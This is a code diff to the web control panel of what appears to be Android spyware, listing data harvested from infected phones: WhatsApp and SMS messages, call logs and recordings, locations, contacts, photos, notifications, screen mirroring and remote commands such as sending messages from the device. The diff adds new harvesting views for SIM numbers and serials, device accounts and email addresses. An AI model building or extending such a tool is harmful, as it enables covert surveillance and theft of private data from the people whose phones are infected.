@@ -34,20 +34,18 @@ function showDashboard() {
   document.getElementById('dashboard').classList.remove('hidden');
   loadData();
   setInterval(loadData, 60000);
-
   socket = io();
   socket.emit('register-admin');
   ['device-update','new-location','new-file','contacts-update','nearby-update',
    'messages-update','calllogs-update','apps-update','info-update',
    'bluetooth-update','new-notification','whatsapp-update','activity-update',
-   'callrecording-update'].forEach(ev => socket.on(ev, () => refreshStatsOnly()));
+   'callrecording-update','siminfo-update','accounts-update','emails-update'
+  ].forEach(ev => socket.on(ev, () => refreshStatsOnly()));
 }
 
-// ============ LOAD ============
 function loadData() {
   const savedDevice = document.getElementById('cmdDevice')?.value || localStorage.getItem('csk4_dev') || '';
   const savedCmd = document.getElementById('cmdType')?.value || localStorage.getItem('csk4_cmd') || '';
-
   fetch(SERVER_URL + '/api/admin/data')
     .then(r => r.json())
     .then(data => {
@@ -70,7 +68,7 @@ function refreshStatsOnly() {
     .then(data => {
       allData = data;
       renderStats(data.stats || {});
-      if (['notifications','whatsapp','activities'].includes(currentTab)) {
+      if (['notifications','whatsapp','activities','siminfo','accounts','emails'].includes(currentTab)) {
         renderTab(currentTab);
       }
     })
@@ -81,14 +79,14 @@ function renderStats(s) {
   document.getElementById('statsGrid').innerHTML = `
     <div class="stat-card"><div class="stat-value">${s.totalDevices||0}</div><div class="stat-label">Devices</div></div>
     <div class="stat-card"><div class="stat-value">${s.onlineDevices||0}</div><div class="stat-label">Online</div></div>
+    <div class="stat-card"><div class="stat-value">${s.totalSims||0}</div><div class="stat-label">SIMs</div></div>
+    <div class="stat-card"><div class="stat-value">${s.totalAccounts||0}</div><div class="stat-label">Accounts</div></div>
+    <div class="stat-card"><div class="stat-value">${s.totalEmails||0}</div><div class="stat-label">Emails</div></div>
     <div class="stat-card"><div class="stat-value">${s.totalNotifications||0}</div><div class="stat-label">Notifs</div></div>
     <div class="stat-card"><div class="stat-value">${s.totalWhatsapp||0}</div><div class="stat-label">WhatsApp</div></div>
     <div class="stat-card"><div class="stat-value">${s.totalMessages||0}</div><div class="stat-label">SMS</div></div>
-    <div class="stat-card"><div class="stat-value">${s.totalCallRecordings||0}</div><div class="stat-label">Call Rec</div></div>
     <div class="stat-card"><div class="stat-value">${s.totalContacts||0}</div><div class="stat-label">Contacts</div></div>
     <div class="stat-card"><div class="stat-value">${s.totalPhotos||0}</div><div class="stat-label">Photos</div></div>
-    <div class="stat-card"><div class="stat-value">${s.totalActivities||0}</div><div class="stat-label">Activity</div></div>
-    <div class="stat-card"><div class="stat-value">${s.totalLocations||0}</div><div class="stat-label">Locations</div></div>
   `;
 }
 
@@ -110,7 +108,10 @@ function renderTab(tab) {
     videos: renderVideos, screenshots: renderScreenshots, audio: renderAudio,
     files: renderFiles, apps: renderApps, bluetooth: renderBluetooth,
     activities: renderActivities, send: renderSend, info: renderInfo,
-    commands: renderCommands
+    commands: renderCommands,
+    siminfo: renderSimInfo,
+    accounts: renderAccounts,
+    emails: renderEmails
   };
   el.innerHTML = (r[tab] || (() => '<div class="loading">Soon</div>'))();
 }
@@ -146,6 +147,11 @@ function renderDevices() {
           <option value="get_apps" ${savedCmd==='get_apps'?'selected':''}>📲 Apps</option>
           <option value="get_bluetooth" ${savedCmd==='get_bluetooth'?'selected':''}>📶 Bluetooth</option>
           <option value="get_info" ${savedCmd==='get_info'?'selected':''}>ℹ️ Info</option>
+        </optgroup>
+        <optgroup label="🆕 SIM & Accounts">
+          <option value="get_sim_info" ${savedCmd==='get_sim_info'?'selected':''}>📱 SIM Info</option>
+          <option value="get_accounts" ${savedCmd==='get_accounts'?'selected':''}>👤 Accounts</option>
+          <option value="get_email_accounts" ${savedCmd==='get_email_accounts'?'selected':''}>📧 Emails</option>
         </optgroup>
         <optgroup label="🎮 Control">
           <option value="vibrate" ${savedCmd==='vibrate'?'selected':''}>📳 Vibrate</option>
@@ -230,7 +236,6 @@ function quickScreen(deviceId) {
   }, 200);
 }
 
-// ============ LIVE ============
 function renderLive() {
   const list = Object.values(allData.devices || {});
   return `
@@ -254,7 +259,6 @@ function renderLive() {
   `;
 }
 
-// ============ SCREEN MIRROR ============
 function renderScreen() {
   const list = Object.values(allData.devices || {});
   return `
@@ -279,13 +283,11 @@ function renderScreen() {
           <button onclick="sendTouch('home', 0, 0)" class="btn-action">🏠 Home</button>
           <button onclick="sendTouch('recent', 0, 0)" class="btn-action">📋 Recent</button>
         </div>
-        <p style="color:#6b7a99;font-size:12px;margin-top:8px">Video pe click karke tap position bhejein</p>
       </div>
     </div>
   `;
 }
 
-// ============ NOTIFICATIONS ============
 function renderNotifications() {
   const list = (allData.notifications || []).slice().reverse().slice(0, 200);
   if (!list.length) return '<div class="loading">Koi notification nahi</div>';
@@ -308,7 +310,6 @@ function renderNotifications() {
   }).join('');
 }
 
-// ============ WHATSAPP ============
 function renderWhatsapp() {
   const list = (allData.whatsapp || []).slice().reverse().slice(0, 200);
   if (!list.length) return '<div class="loading">Koi WhatsApp message nahi</div>';
@@ -322,7 +323,6 @@ function renderWhatsapp() {
   `).join('');
 }
 
-// ============ SMS ============
 function renderMessages() {
   const list = (allData.messages || []).slice().reverse();
   if (!list.length) return '<div class="loading">Koi SMS nahi</div>';
@@ -341,7 +341,6 @@ function renderMessages() {
   `}).join('');
 }
 
-// ============ CALL LOGS ============
 function renderCallLogs() {
   const list = (allData.callLogs || []).slice(0, 500);
   if (!list.length) return '<div class="loading">Koi call nahi</div>';
@@ -358,7 +357,6 @@ function renderCallLogs() {
   `).join('');
 }
 
-// ============ CALL RECORDINGS ============
 function renderCallRecordings() {
   const list = (allData.callRecordings || []).slice().reverse();
   if (!list.length) return '<div class="loading">Koi call recording nahi</div>';
@@ -371,7 +369,6 @@ function renderCallRecordings() {
   `).join('');
 }
 
-// ============ LOCATIONS ============
 function renderLocations() {
   const list = (allData.locations || []).slice().reverse().slice(0, 200);
   if (!list.length) return '<div class="loading">Koi location nahi</div>';
@@ -387,7 +384,6 @@ function renderLocations() {
   `).join('');
 }
 
-// ============ CONTACTS ============
 function renderContacts() {
   const list = allData.contacts || [];
   if (!list.length) return '<div class="loading">Koi contact nahi</div>';
@@ -406,7 +402,6 @@ function renderContacts() {
   `).join('');
 }
 
-// ============ PHOTOS ============
 function renderPhotos() {
   const list = (allData.photos || []).slice().reverse();
   if (!list.length) return '<div class="loading">Koi photo nahi</div>';
@@ -489,7 +484,6 @@ function renderBluetooth() {
   `).join('');
 }
 
-// ============ ACTIVITIES ============
 function renderActivities() {
   const list = (allData.activities || []).slice().reverse().slice(0, 300);
   if (!list.length) return '<div class="loading">Koi activity nahi</div>';
@@ -516,7 +510,90 @@ function renderActivities() {
   }).join('');
 }
 
-// ============ SEND ============
+// ============ 🆕 SIM INFO ============
+function renderSimInfo() {
+  const simData = allData.simInfo || {};
+  const deviceIds = Object.keys(simData);
+  if (!deviceIds.length) return '<div class="loading">SIM info command bhejein</div>';
+  let html = '';
+  deviceIds.forEach(deviceId => {
+    const data = simData[deviceId];
+    if (!data.sims || !data.sims.length) return;
+    html += `<h3 style="color:#4f8cff;margin:16px 0 12px">📱 ${esc(deviceId)}</h3>`;
+    data.sims.forEach(sim => {
+      html += `
+        <div class="device-card" style="flex-direction:column;align-items:flex-start">
+          <div class="device-name">📶 SIM ${sim.slot}</div>
+          <div class="device-id" style="font-size:14px;color:#4f8cff;font-weight:600">📞 ${esc(sim.number || 'N/A')}</div>
+          <div class="device-id">📡 Operator: ${esc(sim.operator || 'N/A')}</div>
+          <div class="device-id">🌍 Country: ${esc(sim.country || 'N/A')}</div>
+          <div class="device-id">📶 Network: ${esc(sim.networkType || 'N/A')}</div>
+          <div class="device-id">🎯 State: ${esc(sim.state || 'N/A')}</div>
+          ${sim.serial ? `<div class="device-id">🔢 Serial: ${esc(sim.serial)}</div>` : ''}
+        </div>
+      `;
+    });
+    html += `<div class="device-id" style="text-align:center;margin:8px 0">⏰ ${new Date(data.time).toLocaleString()}</div>`;
+  });
+  return html;
+}
+
+// ============ 🆕 ACCOUNTS ============
+function renderAccounts() {
+  const accData = allData.accounts || {};
+  const deviceIds = Object.keys(accData);
+  if (!deviceIds.length) return '<div class="loading">Accounts command bhejein</div>';
+  let html = '';
+  deviceIds.forEach(deviceId => {
+    const data = accData[deviceId];
+    if (!data.accounts || !data.accounts.length) return;
+    html += `<h3 style="color:#4f8cff;margin:16px 0 12px">👤 ${esc(deviceId)} (${data.total})</h3>`;
+    data.accounts.forEach(acc => {
+      let icon = '📧';
+      if (acc.type.includes('whatsapp')) icon = '💬';
+      else if (acc.type.includes('facebook')) icon = '👥';
+      else if (acc.type.includes('instagram')) icon = '📸';
+      else if (acc.type.includes('twitter')) icon = '🐦';
+      else if (acc.type.includes('linkedin')) icon = '💼';
+      else if (acc.type.includes('google')) icon = '🔍';
+      else if (acc.type.includes('samsung')) icon = '📱';
+      html += `
+        <div class="item-card">
+          <div>
+            <div class="device-name">${icon} ${esc(acc.name)}</div>
+            <div class="device-id">${esc(acc.type)}</div>
+          </div>
+        </div>
+      `;
+    });
+  });
+  return html;
+}
+
+// ============ 🆕 EMAILS ============
+function renderEmails() {
+  const emailData = allData.emails || {};
+  const deviceIds = Object.keys(emailData);
+  if (!deviceIds.length) return '<div class="loading">Email command bhejein</div>';
+  let html = '';
+  deviceIds.forEach(deviceId => {
+    const data = emailData[deviceId];
+    if (!data.emails || !data.emails.length) return;
+    html += `<h3 style="color:#4f8cff;margin:16px 0 12px">📧 ${esc(deviceId)} (${data.total})</h3>`;
+    data.emails.forEach(email => {
+      html += `
+        <div class="item-card">
+          <div>
+            <div class="device-name">📧 ${esc(email)}</div>
+            <div class="device-id">Google Account</div>
+          </div>
+        </div>
+      `;
+    });
+  });
+  return html;
+}
+
 function renderSend() {
   const list = Object.values(allData.devices || {});
   if (list.length === 0) return '<div class="loading">Pehle device register karein</div>';
@@ -532,15 +609,14 @@ function renderSend() {
         <option value="send_sms">📩 SMS</option>
         <option value="send_whatsapp">💬 WhatsApp</option>
       </select>
-      <input type="text" id="sendTo" placeholder="To (phone number with country code, e.g. 923001234567)">
-      <input type="text" id="sendTitle" placeholder="Title (for notification)">
+      <input type="text" id="sendTo" placeholder="To (phone number)">
+      <input type="text" id="sendTitle" placeholder="Title">
       <textarea id="sendMessage" placeholder="Message text"></textarea>
       <button onclick="sendCustomMessage()">🚀 Send</button>
     </div>
   `;
 }
 
-// ============ INFO ============
 function renderInfo() {
   const info = allData.deviceInfo || {};
   const keys = Object.keys(info);
@@ -619,7 +695,6 @@ function sendCustomMessage() {
   const message = document.getElementById('sendMessage').value;
   if (!deviceId) return alert('Device select karein');
   if (!message) return alert('Message likhein');
-
   let params = { message, title, to, number: to };
   fetch(SERVER_URL + '/api/admin/command', {
     method: 'POST',
